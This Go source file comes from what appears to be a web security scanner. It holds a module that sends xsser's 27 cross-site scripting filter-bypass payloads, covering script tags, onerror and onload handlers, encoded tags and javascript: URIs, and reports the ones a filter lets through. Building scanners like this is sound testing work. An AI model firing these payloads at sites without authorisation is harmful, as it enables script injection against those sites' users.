package active

import (
	"context"
	"fmt"
	"regexp"
	"strings"
)

// domVector is one shape from xsser's `core/fuzzing/DOM.py` — the filter-bypass
// spellings that `--Dom` sends and then verifies **only** in a browser.
//
// The shapes are upstream's, in upstream's order, and the reason they exist is
// upstream's reason: a filter is written against one spelling, so a scanner that
// sends one spelling reports "filtered" on a page that filters nothing. The whole
// table is 27 spellings of the same claim, and the claim is settled by execution,
// which is why every one of them is a browser row rather than a structural one.
type domVector struct {
	// name is what the report calls the shape, so a reader can look it up.
	name string
	// shape carries `%s` where upstream carries `PAYLOAD` or an `alert()` call.
	shape string
	// statement says which kind of statement the slot takes, and it is not a
	// detail: upstream's table puts `PAYLOAD` in three different positions and a
	// single substitution does not fit all three.
	statement domStatementKind
	// executedByRequest is false for the two shapes whose mechanism is *evaluating
	// a regular-expression source*. Their payload travels as text that the page
	// evaluates, so the request-carrying marker cannot travel the same way: what
	// the page would fetch is the marker written inside a string, not the marker.
	// They are still reported, still reflected, and still filter bypasses — they
	// simply have no browser proof here, and the report says so by not claiming one.
	executedByRequest bool
}

// domStatementKind is one of the three positions `PAYLOAD` occupies upstream.
type domStatementKind int

const (
	// domStatementCall replaces an `alert(<marker>)` call site: the marker goes
	// in as the call's argument.
	domStatementCall domStatementKind = iota
	// domStatementBody replaces a bare `PAYLOAD` in an event-handler body, where
	// there is no call to replace and the statement has to be the body.
	domStatementBody
	// domStatementSource replaces `PAYLOAD` inside a regular-expression literal
	// whose `.source` is then evaluated. The marker goes in with escaped slashes,
	// because a regex `.source` keeps them and the evaluation turns `\/` back into
	// `/` — so the request the page makes is the marker and not a spelling of it.
	domStatementSource
)

// domVectors is xsser's table, in upstream's order.
//
// The `Y#` prefix each upstream vector carries is xsser's own reflection marker
// (`hashed_payload`), which names the row for *its* report. This package has a
// marker already and a per-row identity, so the prefix is dropped: keeping it
// would put a second, meaningless token into every payload and into every
// reflection this detector reads.
var domVectors = []domVector{
	{"script element", `Y#<script>%s</script>`, domStatementCall, true},
	{"comment-close then script", `Y#<%<!--'%><script>%s</script -->`, domStatementCall, true},
	{"attribute-like tag name", `Y#<script ^__^>%s</script ^__^`, domStatementCall, true},
	{"data uri script", `Y#<script src="data:text/javascript,%s"></script>`, domStatementCall, true},
	{"arithmetic around the statement", `Y#<script>+-+-1-+-+%s</script>`, domStatementCall, true},
	{"bogus attribute pair", `Y#<script x> %s </script 1=2`, domStatementCall, true},
	{"eval chain over a regex source", `Y#<script>a=eval;b=alert;a(b(/ %s/.source));</script>'">`, domStatementSource, false},
	{"slash as tag separator", `Y#<script/y~~~>;%s;</script/Y~~~>`, domStatementCall, true},
	{"nul byte then smart quote", "Y#%00“><script>%s</script>", domStatementCall, true},
	{"percent-encoded whole tag", `Y#%22%3E%3Cscript%3E%s%3B%3C%2Fscript%3E`, domStatementCall, true},
	{"percent-encoded tag, raw angle", `Y#%3Cscript%3E%s%3B%3C%2Fscript%3E`, domStatementCall, true},
	{"backtick then encoded tag", "Y#`\"><%3Cscript>%s</script>", domStatementCall, true},
	{"mixed encoding, javascript uri", `Y#%3Cscript>javascript:%s</script>`, domStatementCall, true},
	{"uppercase tag with regex source", `Y#<SCRIPT>a=/%s/alert(a.source)</SCRIPT>`, domStatementSource, false},
	{"svg onload", `Y#<svg onload=%s>`, domStatementBody, true},
	{"img onerror", `Y#<img src=x onerror=%s>`, domStatementBody, true},
	{"details ontoggle", `Y#<details open ontoggle=%s>`, domStatementBody, true},
	{"video source onerror", `Y#<video><source onerror=%s>`, domStatementBody, true},
	{"autofocus onfocus", `Y#<xss onfocus=%s autofocus tabindex=1>`, domStatementBody, true},
	{"iframe srcdoc", `Y#<iframe srcdoc="&lt;svg onload=%s&gt;">`, domStatementBody, true},
	{"svg animate onbegin", `Y#<svg><animate onbegin=%s attributeName=x dur=1s>`, domStatementBody, true},
	{"javascript uri", `Y#javascript:%s`, domStatementBody, true},
	{"single-quoted handler", `Y#x' onerror='%s`, domStatementCall, true},
	{"double-quoted handler", `Y#x" onerror="%s`, domStatementCall, true},
	{"single quote then tag", `Y#'><img src=x onerror=%s>`, domStatementBody, true},
	{"double quote then tag", `Y#"><img src=x onerror=%s>`, domStatementBody, true},
	{"javascript uri with call", `Y#javascript:%s`, domStatementBody, true},
}

// domMarker renders the marker for one slot position.
func domMarker(kind domStatementKind, marker string) string {
	switch kind {
	case domStatementCall:
		// The argument of a call: `fetch(<marker>)`.
		return "fetch(" + marker + ")"
	case domStatementSource:
		// Inside a regex literal, whose `.source` is evaluated: the slashes have to
		// be escaped for the literal, and the evaluation turns them back.
		return strings.ReplaceAll(marker, "/", `\/`)
	default:
		// A handler body, which is a statement: `fetch('<marker>')`.
		return "fetch('" + marker + "')"
	}
}

// domVectorPayload builds one vector's payload for this run.
//
// The `Y#` prefix is removed here rather than in the table, so the table can stay
// a transcription of upstream's file and the difference between the two is one
// documented line instead of 27 edits to compare against.
func domVectorPayload(vector domVector, marker string) (string, bool) {
	if strings.TrimSpace(marker) == "" {
		return "", false
	}
	shape := strings.Replace(vector.shape, "Y#", "", 1)
	shape = strings.ReplaceAll(shape, "alert(", "fetch(")
	// Two shapes carry the call *after* the slot (`…/alert(a.source)`), so the
	// slot holds the marker as a source and the rewritten call evaluates it.
	if !strings.Contains(shape, "%s") {
		return "", false
	}
	return strings.Replace(shape, "%s", domMarker(vector.statement, marker), 1), true
}

// DOMVectors is the filter-bypass escalation: when a value is reflected and the
// surface filters it, these 27 spellings are what is left to try.
//
// The gate is upstream's. xsser sends the table only when its heuristic says the
// value survived a filter, and the difference matters: 27 requests on every
// surface of every site is a scan nobody runs, while 27 requests on the surfaces
// that actually filter is the escalation the table exists for. A run with no
// filter anywhere spends nothing here, and the report says so rather than looking
// like a run that tried 27 shapes and found nothing.
type DOMVectors struct{}

// Name implements Module.
func (DOMVectors) Name() string { return "dom-vectors" }

// Level implements Module.
func (DOMVectors) Level() Level { return LevelParam }

// Scan probes one surface with the whole table.
func (m DOMVectors) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if baseline == nil {
		return nil
	}
	// A value that is not reflected cannot be escaped: the gate is the reflection,
	// and `Fresh` is what makes it a reflection rather than a page that already
	// carried the vector.
	// The reflection gate is a canary, not a vector.
	//
	// A vector is the wrong token for it: on the surface this module exists for —
	// one that escapes `<` and `>` — a vector is reflected *escaped*, so asking
	// whether the vector came back unchanged answers "no" on precisely the pages
	// that need the table. A canary has no characters a filter touches, so it
	// answers the question actually being asked: does this parameter reach the
	// response at all.
	canary := newCanary("rrdom")
	if canary == "" {
		return nil
	}
	reflected, err := t.Fire(ctx, p, p.Param, canary, false, nil)
	if err != nil || reflected == nil || !Fresh(baseline, reflected, canary) {
		return nil
	}
	// The filter test, and the reason the table is gated: a surface that filters
	// the plain shape is the surface where another spelling is the only thing left
	// to try. A surface that passes it needs none of this — the structural detector
	// already owns it.
	//
	// The cost of the gate is the cost of the table: one request for the canary,
	// `len(xsseProbeChars)` for the filter probe, and the table itself. It is spent
	// only where a filter answered.
	filter := probeFilter(ctx, t, p, reflected)
	if filter.allowsString(`<img src=x onerror=fetch('x')>`) {
		// The plain shape survives, so the escalation has nothing to add: the
		// structural detector already owns this surface.
		return nil
	}
	var findings []Finding
	for _, vector := range domVectors {
		payload, ok := domVectorPayload(vector, "rrprobe")
		if !ok {
			continue
		}
		response, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err != nil || response == nil {
			continue
		}
		if !Fresh(baseline, response, payload) {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module: "dom-vectors",
			Title: fmt.Sprintf("filter bypass: %s reaches the page through a filter that "+
				"blocked the plain shape", vector.name),
			Claimed: SeverityHigh,
			Tier:    TierPotential,
			Point:   p,
			Payload: payload,
			Evidence: fmt.Sprintf("the surface filters <img src=x onerror=…> and reflected this "+
				"spelling unchanged: %s", trimEvidence(response.Body)),
			Description: "A filter written against one spelling is not a filter. Each of these " +
				"shapes is the same statement written differently, so a target that blocks one " +
				"of them and reflects the next is filtering a string rather than a script. The " +
				"browser stage is what settles the row: a spelling that reaches the page proves " +
				"nothing until the browser runs it.",
			Remediation: "Filter on structure, not on spelling: parse the value where it lands " +
				"and allow-list what may appear there. Escaping for the context it is written " +
				"into closes the whole table at once, which no spelling table does.",
		})
		findings = append(findings, finding)
	}
	return findings
}

// domVectorProofPayloads are the executed spellings for a browser to try.
//
// Every vector of the table, in order, because the order *is* the escalation: the
// shapes upstream put first are the ones their users hit first, and a page that
// runs the first one settles the row in a single load.
func domVectorProofPayloads(finding Finding, marker string) []string {
	// Only this module's own rows are executed here; an unrelated row that reached
	// this registry by name would be sent a payload the detector never described.
	if finding.Module != "dom-vectors" || strings.TrimSpace(marker) == "" {
		return nil
	}
	type shaped struct {
		payload string
		shape   string
	}
	var out []shaped
	seen := map[string]bool{}
	for _, vector := range domVectors {
		if !vector.executedByRequest {
			// Two shapes carry their payload as evaluated text, so there is no
			// request to watch for and no marker to place: they are reported and
			// never offered to the browser.
			continue
		}
		payload, ok := domVectorPayload(vector, marker)
		if !ok || seen[payload] {
			continue
		}
		seen[payload] = true
		out = append(out, shaped{payload: payload, shape: domVectorSkeleton(vector)})
	}
	// The row's own shape goes first.
	//
	// The row was reported because *that* shape reached the page, so it is the one
	// most likely to run there; and the cost is the reason this ordering exists: the
	// executable table is 25 shapes and each navigation costs seconds, so a row
	// settled only after the walk paid two dozen page loads to learn something the
	// report already said. The match is by skeleton rather than by string because
	// the row's payload was written with the detector's probe marker and the
	// executed one carries this run's marker — same shape, different token.
	if skeleton := domVectorSkeletonOfText(finding.Payload); skeleton != "" {
		for i, entry := range out {
			if entry.shape != skeleton {
				continue
			}
			ordered := append([]shaped{entry}, out[:i]...)
			ordered = append(ordered, out[i+1:]...)
			out = ordered
			break
		}
	}
	payloads := make([]string, 0, len(out))
	for _, entry := range out {
		payloads = append(payloads, entry.payload)
	}
	return payloads
}

// domVectorSkeleton reduces a vector to the shape that survives a marker change,
// so a row's reported payload and this run's executed payload of that shape compare
// equal.
//
// It exists because the two strings cannot be equal: the row was written with the
// detector's probe marker and the executed payload carries this run's marker. What
// identifies the shape is everything *except* the statement, so the statement is
// canonicalised — a call becomes `CALL`, a bare marker becomes `M` — and the rest
// is compared as it stands.
func domVectorSkeleton(vector domVector) string {
	shape := strings.Replace(vector.shape, "Y#", "", 1)
	shape = strings.ReplaceAll(shape, "alert(", "fetch(")
	slot := "M"
	if vector.statement != domStatementSource {
		slot = "CALL"
	}
	return domVectorSkeletonOfText(strings.Replace(shape, "%s", slot, 1))
}

// domVectorSkeletonOfText canonicalises a rendered payload.
func domVectorSkeletonOfText(payload string) string {
	payload = domVectorCall.ReplaceAllString(payload, "CALL")
	return domVectorMarker.ReplaceAllString(payload, "M")
}

var (
	// domVectorCall is any statement that carries a marker, whatever quote style and
	// whatever argument: `fetch("http://…")`, `fetch('http://…')`, `fetch(M)`.
	domVectorCall = regexp.MustCompile(`fetch\((?:"[^"]*"|'[^']*'|[^()]*)\)`)
	// domVectorMarker is a marker left outside a call, which is the shape of the two
	// source-position vectors.
	domVectorMarker = regexp.MustCompile(`(?:https?:)?(?:\\/\/|//)[A-Za-z0-9.-]*\.invalid[^\s]*|rrprobe`)
)
